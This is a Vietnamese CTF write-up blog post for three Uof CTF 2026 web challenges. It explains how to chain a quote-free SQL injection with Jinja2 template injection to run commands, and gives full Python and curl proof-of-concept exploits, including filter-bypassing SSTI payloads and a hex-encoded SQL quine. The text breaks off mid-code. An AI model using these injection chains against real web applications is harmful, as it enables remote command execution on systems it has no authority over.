@@ -1,0 +1,322 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Writeup: Uof CTF 2026 | H00d1eBl4ck</title><meta name="author" content="H00d1eBl4ck"><meta name="copyright" content="H00d1eBl4ck"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Web | No QuotesHướng giải Bài này là combo SQLi (bypass no quotes) –&gt; UNION để trả về username chứa payload → SSTI Jinja2 ở &#x2F;home–&gt; chạy &#x2F;readflag để lấy flag.  1. Điểm yếu trong code  SQLi ở &#x2F;l">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Writeup: Uof CTF 2026">
+<meta property="og:url" content="https://elliotbigfan.github.io/2026/01/19/2026/ctf/uof/wu/index.html">
+<meta property="og:site_name" content="H00d1eBl4ck">
+<meta property="og:description" content="Web | No QuotesHướng giải Bài này là combo SQLi (bypass no quotes) –&gt; UNION để trả về username chứa payload → SSTI Jinja2 ở &#x2F;home–&gt; chạy &#x2F;readflag để lấy flag.  1. Điểm yếu trong code  SQLi ở &#x2F;l">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://elliotbigfan.github.io/img/ctf/uof/poster.png">
+<meta property="article:published_time" content="2026-01-19T09:21:56.000Z">
+<meta property="article:modified_time" content="2026-01-19T11:01:35.278Z">
+<meta property="article:author" content="H00d1eBl4ck">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://elliotbigfan.github.io/img/ctf/uof/poster.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Writeup: Uof CTF 2026",
+  "url": "https://elliotbigfan.github.io/2026/01/19/2026/ctf/uof/wu/",
+  "image": "https://elliotbigfan.github.io/img/ctf/uof/poster.png",
+  "datePublished": "2026-01-19T09:21:56.000Z",
+  "dateModified": "2026-01-19T11:01:35.278Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "H00d1eBl4ck",
+      "url": "https://elliotbigfan.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon_io/favicon.ico"><link rel="canonical" href="https://elliotbigfan.github.io/2026/01/19/2026/ctf/uof/wu/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Writeup: Uof CTF 2026',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/favicon_io/android-chrome-192x192.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">13</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/bookmark/"><i class="fa-fw fas fa-bookmark"></i><span> Bookmark</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-person"></i><span> About Me</span></a></div><div class="menus_item"><a class="site-page" href="/certificate/"><i class="fa-fw fas fa-certificate"></i><span> Certificate</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/ctf/uof/poster.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/favicon_io/favicon.ico" alt="Logo"><span class="site-name">H00d1eBl4ck</span></a><a class="nav-page-title" href="/"><span class="site-name">Writeup: Uof CTF 2026</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/bookmark/"><i class="fa-fw fas fa-bookmark"></i><span> Bookmark</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-person"></i><span> About Me</span></a></div><div class="menus_item"><a class="site-page" href="/certificate/"><i class="fa-fw fas fa-certificate"></i><span> Certificate</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Writeup: Uof CTF 2026</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-01-19T09:21:56.000Z" title="Created 2026-01-19 16:21:56">2026-01-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-01-19T11:01:35.278Z" title="Updated 2026-01-19 18:01:35">2026-01-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/Uof-CTF/">Uof CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>11mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Web-No-Quotes"><a href="#Web-No-Quotes" class="headerlink" title="Web | No Quotes"></a>Web | No Quotes</h1><h2 id="Huong-giai"><a href="#Huong-giai" class="headerlink" title="Hướng giải"></a>Hướng giải</h2><ul>
+<li>Bài này là combo SQLi (bypass <strong>no quotes</strong>) –&gt; UNION để trả về username chứa payload → SSTI Jinja2 ở <code>/home</code>–&gt; chạy <code>/readflag</code> để lấy flag.</li>
+</ul>
+<p><strong>1. Điểm yếu trong code</strong></p>
+<ul>
+<li>SQLi ở <code>/login</code></li>
+<li>Query được ghép thẳng:</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT <span class="built_in">id</span>, username FROM users</span><br><span class="line">WHERE username = (<span class="string">&#x27;&#123;username&#125;&#x27;</span>) AND password = (<span class="string">&#x27;&#123;password&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>WAF chỉ chặn <code>&#39;</code> và <code>&quot;</code>, nên vẫn còn đường khác.</p>
+</li>
+<li><p>SSTI ở <code>/home</code></p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template_string(<span class="built_in">open</span>(<span class="string">&quot;templates/home.html&quot;</span>).read() % session[<span class="string">&quot;user&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>session[&quot;user&quot;]</code> bị nhét vào HTML bằng <code>%s</code> trước khi Jinja render –&gt; nếu user chứa <code>&#123;&#123; ... &#125;&#125;</code> thì Jinja sẽ execute.</li>
+</ul>
+<p><strong>2. Bypass no quotes bằng backslash <code>\</code></strong></p>
+<ul>
+<li><code>MySQL/MariaDB</code> mặc định cho <code>\</code> escape ký tự <code>&#39;</code>.</li>
+<li>Nếu username kết thúc bằng <code>\</code>, nó sẽ escape dấu <code>&#39;</code> đóng và làm câu SQL bị <strong>lệch</strong>, khiến phần password trở thành nơi để <strong>truyền</strong> SQL injection mà không cần quotes.</li>
+</ul>
+<h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">BASE_URL = <span class="string">&quot;https://no-quotes-5af41ca8f4ac0188.chals.uoftctf.org&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_str</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;char(&quot;</span> + <span class="string">&quot;,&quot;</span>.join(<span class="built_in">str</span>(<span class="built_in">ord</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> s) + <span class="string">&quot;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/login&quot;</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    ssti = <span class="string">&quot;&#123;&#123;lipsum.__globals__.os.popen(&#x27;/readflag&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">    username = <span class="string">&#x27;\\&#x27;</span></span><br><span class="line">    password = <span class="string">f&#x27;) UNION SELECT 1, <span class="subst">&#123;encode_str(ssti)&#125;</span>;-- -&#x27;</span></span><br><span class="line">    r = s.post(url, data=&#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password&#125;)</span><br><span class="line">    <span class="built_in">print</span>(re.search(<span class="string">r&#x27;uoftctf\&#123;.*?\&#125;&#x27;</span>, r.text).group(<span class="number">0</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>
+
+<h1 id="Web-No-Quotes-2"><a href="#Web-No-Quotes-2" class="headerlink" title="Web | No Quotes 2"></a>Web | No Quotes 2</h1><h2 id="Huong-giai-1"><a href="#Huong-giai-1" class="headerlink" title="Hướng giải"></a>Hướng giải</h2><ul>
+<li>Mọi thứ gần như giống với bài No Quotes trên, nhưng thêm một đoạn để check:</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> username == row[<span class="number">0</span>] <span class="keyword">or</span> <span class="keyword">not</span> password == row[<span class="number">1</span>]:</span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">&quot;login.html&quot;</span>,</span><br><span class="line">        error=<span class="string">&quot;Invalid credentials.&quot;</span>,</span><br><span class="line">        username=username,</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Đoạn trên sẽ check liệu dữ liệu nhập vào có giống với dữ liệu trả về từ database hay không, nếu không sẽ chặn.</li>
+<li>Với bài này thì có hai hướng là dùng <code>information_schema.processlist</code> hoặc <code>Quine</code> (trả về đúng với những gì đã nhập).</li>
+<li>Ở bài này thì mình sẽ dùng <code>information_schema.processlist</code> để giải, còn cách <code>Quine</code> sẽ dành cho bài tiếp theo.</li>
+<li>Trong MySQL&#x2F;MariaDB, <code>information_schema.processlist.INFO</code> chứa câu <strong>SQL hiện tại</strong> của connection.</li>
+<li>Ta UNION vào processlist của chính connection (ID &#x3D; CONNECTION_ID()), rồi dùng <code>SUBSTRING_INDEX</code> để cắt ra đúng phần <code>username/password</code> từ <code>INFO</code>.</li>
+</ul>
+<h2 id="Poc-1"><a href="#Poc-1" class="headerlink" title="Poc"></a>Poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">FLAG_RE = re.<span class="built_in">compile</span>(<span class="string">r&quot;[A-Za-z0-9_]+\&#123;[^&#125;]+\&#125;&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    query = (</span></span><br><span class="line"><span class="string">        &quot;SELECT username, password FROM users &quot;</span></span><br><span class="line"><span class="string">        f&quot;WHERE username = (&#x27;&#123;username&#125;&#x27;) AND password = (&#x27;&#123;password&#125;&#x27;)&quot;</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Usage: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> &lt;host&gt; &lt;port&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    host = sys.argv[<span class="number">1</span>]</span><br><span class="line">    port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    base = <span class="string">f&quot;http://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">if</span> port == <span class="number">443</span>:</span><br><span class="line">        base = <span class="string">f&#x27;https://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>&#x27;</span></span><br><span class="line">    <span class="comment"># Quote-less SSTI. Command passed via /home?c=/readflag</span></span><br><span class="line">    username = <span class="string">&quot;&#123;&#123;cycler.__init__.__globals__.os.popen(request.args.c).read()&#125;&#125;\\&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Hex delimiters (no quotes in SQL)</span></span><br><span class="line">    OPEN  = <span class="string">&quot;0x2827&quot;</span>            <span class="comment"># &quot;(&#x27;&quot;</span></span><br><span class="line">    CLOSE = <span class="string">&quot;0x2729&quot;</span>            <span class="comment"># &quot;&#x27;)&quot;</span></span><br><span class="line">    MID   = <span class="string">&quot;0x272920414e44&quot;</span>    <span class="comment"># &quot;&#x27;) AND&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Extract username from INFO:</span></span><br><span class="line">    u_expr = (</span><br><span class="line">        <span class="string">f&#x27;SUBSTRING_INDEX(SUBSTRING_INDEX(INFO, <span class="subst">&#123;MID&#125;</span>, 1), <span class="subst">&#123;OPEN&#125;</span>, -1)&#x27;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Extract password from INFO:</span></span><br><span class="line">    <span class="comment"># take chunk after last &quot;(&#x27;&quot;, then cut before &quot;&#x27;)&quot;</span></span><br><span class="line">    p_expr = <span class="string">f&quot;SUBSTRING_INDEX(SUBSTRING_INDEX(INFO,<span class="subst">&#123;OPEN&#125;</span>,-1),<span class="subst">&#123;CLOSE&#125;</span>,1)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Password becomes SQL (due to username ending with backslash escaping quote)</span></span><br><span class="line">    password = (</span><br><span class="line">        <span class="string">f&quot;)UNION SELECT <span class="subst">&#123;u_expr&#125;</span>,<span class="subst">&#123;p_expr&#125;</span> &quot;</span></span><br><span class="line">        <span class="string">f&quot;FROM information_schema.processlist &quot;</span></span><br><span class="line">        <span class="string">f&quot;WHERE ID=CONNECTION_ID()#&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    s = requests.Session()</span><br><span class="line"></span><br><span class="line">    r = s.post(</span><br><span class="line">        base + <span class="string">&quot;/login&quot;</span>,</span><br><span class="line">        data=&#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password&#125;,</span><br><span class="line">        allow_redirects=<span class="literal">True</span>,</span><br><span class="line">        timeout=<span class="number">10</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Now hit /home with command parameter so SSTI executes /readflag</span></span><br><span class="line">    r2 = s.get(base + <span class="string">&quot;/home&quot;</span>, params=&#123;<span class="string">&quot;c&quot;</span>: <span class="string">&quot;/readflag&quot;</span>&#125;, timeout=<span class="number">10</span>)</span><br><span class="line">    html = r2.text</span><br><span class="line"></span><br><span class="line">    m = FLAG_RE.search(html)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] Username: <span class="subst">&#123;username&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] Password: <span class="subst">&#123;password&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[*] Flag: <span class="subst">&#123;m.group(<span class="number">0</span>)&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Flag not found&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h1 id="Web-No-Quotes-3"><a href="#Web-No-Quotes-3" class="headerlink" title="Web | No Quotes 3"></a>Web | No Quotes 3</h1><h2 id="Huong-giai-2"><a href="#Huong-giai-2" class="headerlink" title="Hướng giải"></a>Hướng giải</h2><ul>
+<li>Quan sát <code>waf</code>:</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">value: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    blacklist = [<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;.&quot;</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(char <span class="keyword">in</span> value <span class="keyword">for</span> char <span class="keyword">in</span> blacklist)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Ở bài này có sự thay đổi ở waf khi chặn <code>.</code> dẫn đến ta không thể dùng <code>information_schema.processlist</code> giống như ở No Quotes 2. Vì vậy, ta sẽ đi theo hướng 2 nhằm cố gắng tạo một payload SQLi sao cho username, password trả về giống với username, password đã nhập vào. (Quine)</li>
+<li>Ngoài ra có mã hóa password bằng sha256 ở code check:</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> username == row[<span class="number">0</span>] <span class="keyword">or</span> <span class="keyword">not</span> hashlib.sha256(password.encode()).hexdigest() == row[<span class="number">1</span>]:</span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">&quot;login.html&quot;</span>,</span><br><span class="line">        error=<span class="string">&quot;Invalid credentials.&quot;</span>,</span><br><span class="line">        username=username,</span><br><span class="line">        username_db=row[<span class="number">0</span>],</span><br><span class="line">        password_input=password,</span><br><span class="line">        hashed_password_input=hashlib.sha256(password.encode()).hexdigest(),</span><br><span class="line">        password_db=row[<span class="number">1</span>]</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Muốn login thành công, SQL injection phải tạo ra một row giả sao cho:<ul>
+<li>cột 1 &#x3D; đúng y nguyên username bạn gửi</li>
+<li>cột 2 &#x3D; đúng y nguyên SHA256 của password input (chính là chuỗi payload injection)</li>
+</ul>
+</li>
+<li>Đây là lý do phải chơi quine.</li>
+</ul>
+<h2 id="Poc-va-giai-thich"><a href="#Poc-va-giai-thich" class="headerlink" title="Poc và giải thích"></a>Poc và giải thích</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] curl -c c.txt http://localhost:5000/login --data-urlencode &quot;username=&#123;&#123;cycler|attr(dict(__init__=1)|first)|attr(dict(__globals__=1)|first)|attr(dict(__getitem__=1)|first)(dict(os=1)|first)|attr(dict(popen=1)|first)(request|attr(dict(args=1)|first)|attr(dict(get=1)|first)(dict(c=1)|first))|attr(dict(read=1)|first)()&#125;&#125;\\&quot; --data-urlencode &quot;password=) UNION SELECT CAST(0x7b7b6379636c65727c617474722864696374285f5f696e69745f5f3d31297c6669727374297c617474722864696374285f5f676c6f62616c735f5f3d31297c6669727374297c617474722864696374285f5f6765746974656d5f5f3d31297c6669727374292864696374286f733d31297c6669727374297c61747472286469637428706f70656e3d31297c66697273742928726571756573747c61747472286469637428617267733d31297c6669727374297c617474722864696374286765743d31297c666972737429286469637428633d31297c666972737429297c61747472286469637428726561643d31297c66697273742928297d7d5c AS CHAR),IF((@q:=0x2920554e494f4e2053454c454354204341535428307837623762363337393633366336353732376336313734373437323238363436393633373432383566356636393665363937343566356633643331323937633636363937323733373432393763363137343734373232383634363936333734323835663566363736633666363236313663373335663566336433313239376336363639373237333734323937633631373437343732323836343639363337343238356635663637363537343639373436353664356635663364333132393763363636393732373337343239323836343639363337343238366637333364333132393763363636393732373337343239376336313734373437323238363436393633373432383730366637303635366533643331323937633636363937323733373432393238373236353731373536353733373437633631373437343732323836343639363337343238363137323637373333643331323937633636363937323733373432393763363137343734373232383634363936333734323836373635373433643331323937633636363937323733373432393238363436393633373432383633336433313239376336363639373237333734323932393763363137343734373232383634363936333734323837323635363136343364333132393763363636393732373337343239323832393764376435632041532043484152292c4946282840713a3d30783f29204953204e4f54204e554c4c2c4c4f5745522853484132285245504c4143452840712c307833662c4c4f574552284845582840712929292c32353629292c302923) IS NOT NULL,LOWER(SHA2(REPLACE(@q,0x3f,LOWER(HEX(@q))),256)),0)#&quot;</span><br><span class="line"></span><br><span class="line">[+] curl -b c.txt http://localhost:5000/home?c=/readflag</span><br></pre></td></tr></table></figure>
+
+<p><strong>1. Phần username: SSTI dotless&#x2F;quoteless (Jinja)</strong></p>
+<ul>
+<li>username:</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;cycler</span><br><span class="line">|attr(<span class="built_in">dict</span>(__init__=<span class="number">1</span>)|first)</span><br><span class="line">|attr(<span class="built_in">dict</span>(__globals__=<span class="number">1</span>)|first)</span><br><span class="line">|attr(<span class="built_in">dict</span>(__getitem__=<span class="number">1</span>)|first)(<span class="built_in">dict</span>(os=<span class="number">1</span>)|first)</span><br><span class="line">|attr(<span class="built_in">dict</span>(popen=<span class="number">1</span>)|first)(</span><br><span class="line">    request</span><br><span class="line">    |attr(<span class="built_in">dict</span>(args=<span class="number">1</span>)|first)</span><br><span class="line">    |attr(<span class="built_in">dict</span>(get=<span class="number">1</span>)|first)(<span 